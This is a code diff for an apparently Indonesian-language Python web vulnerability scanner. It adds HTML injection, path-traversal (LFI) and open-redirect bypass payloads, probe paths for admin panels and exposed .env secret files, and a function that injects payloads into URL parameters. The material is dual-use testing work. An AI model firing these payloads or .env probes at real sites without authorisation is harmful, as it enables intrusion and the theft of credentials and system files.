@@ -17,27 +17,79 @@ PAYLOADS = {
         '"><script>alert(1)</script>',
         "<img src=x onerror=alert(1)>"
     ],
+    "HTML Injection": [
+        # Basic HTML Tags & Form Injection
+        "<h1>Injected</h1>",
+        "<h1><font color=red>HTML Injection</font></h1>",
+        "<iframe src=\"javascript:alert(1)\"></iframe>",
+        "<a href=\"http://example.com\">Click Here</a>",
+        "<u>TestHTML</u>",
+        # Attribute Breakout Tricks
+        "\"><h1/id=test>Injected</h1>",
+        "'\"><img src=x>"
+    ],
     "LFI (Local File Inclusion)": [
+        # Linux Basic & Deep Traversal
         "../../../../etc/passwd",
+        "../../../../../../../../etc/passwd",
+        
+        # Bypass & Encoding Tricks
+        "....//....//....//etc/passwd",
+        "..%2f..%2f..%2f..%2fetc%2fpasswd",
+        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+        "../../../../etc/passwd%00",
+        
+        # Windows Path Traversal
         "..\\..\\..\\..\\windows\\win.ini",
-        "/etc/passwd",
-        "....//....//....//etc/passwd"
+        "../../../../boot.ini",
+        "c:/windows/win.ini",
+        
+        # PHP Source Disclosure Wrapper
+        "php://filter/convert.base64-encode/resource=index.php"
     ],
     "Open Redirect": [
+        # Standard & Protocol Relative
         "https://google.com",
         "//google.com",
-        "/\/\/google.com"
+        "/\\google.com",
+        "/https://google.com",
+        
+        # Bypass Tricks & Encodings
+        "https://google.com%23",
+        "//google.com/%2f..",
+        "///google.com",
+        "http:google.com",
+        "https://google.com@target.com",
+        
+        # IP Encoding & Loopback / External Test
+        "http://2130706433",  # Decimal IP
+        "http://0730.01.01.01" # Octal IP
     ]
 }
 
 ADMIN_PATHS = [
-    "admin/", "administrator/", "wp-admin/", "login/", "admin-panel/", 
-    "cpanel/", "manage/", "backend/", "secret/"
+    "/admin", "/admin/login", "/administrator", "/admin.php",
+    "/admin/login.php", "/wp-admin", "/cpanel"
 ]
 
 ENV_PATHS = [
-    ".env", ".env.local", ".env.dev", ".env.production", "api/.env", 
-    ".git/config", "config.json"
+    # 1. Standard Root & Common Backups
+    ".env",
+    ".env.local",
+    ".env.bak",
+    ".env.old",
+    ".env.example",
+    ".env.save",
+    
+    # 2. Production & Environment Variations
+    ".env.production",
+    ".env.dev",
+    
+    # 3. Common Subdirectories (Framework & API Stack)
+    "api/.env",
+    "backend/.env",
+    "core/.env",
+    "app/.env"
 ]
 
 SQL_ERRORS = [
@@ -116,6 +168,27 @@ def check_xss(target_url):
             continue
     return "SAFE", "Payload XSS tidak terefleksi kembali"
 
+def check_html_injection(target_url):
+    parsed = urlparse(target_url)
+    if not parsed.query:
+        return "INFO", "Bukan URL berbasis parameter (tidak ada ?param=val)"
+
+    for payload in PAYLOADS["HTML Injection"]:
+        test_query = parsed.query
+        for param in test_query.split("&"):
+            if "=" in param:
+                k, v = param.split("=", 1)
+                test_query = test_query.replace(f"{k}={v}", f"{k}={payload}")
+
+        test_url = target_url.replace(parsed.query, test_query)
+        try:
+            res = requests.get(test_url, timeout=5)
+            if payload in res.text:
+                return "VULNERABLE", f"Tag HTML terefleksi tanpa sanitasi: {payload}"
+        except requests.RequestException:
+            continue
+    return "SAFE", "Tag HTML berhasil di-escape atau disanitasi"
+
 def check_lfi(target_url):
     parsed = urlparse(target_url)
     if not parsed.query:
@@ -182,6 +255,7 @@ def run():
                 ("Admin Panel Finder", check_admin_panel),
                 ("SQL Injection Scanner", check_sql_injection),
                 ("XSS Scanner", check_xss),
+                ("HTML Injection Scanner", check_html_injection),
                 ("LFI Scanner", check_lfi),
                 ("Open Redirect Scanner", check_open_redirect),
             ]
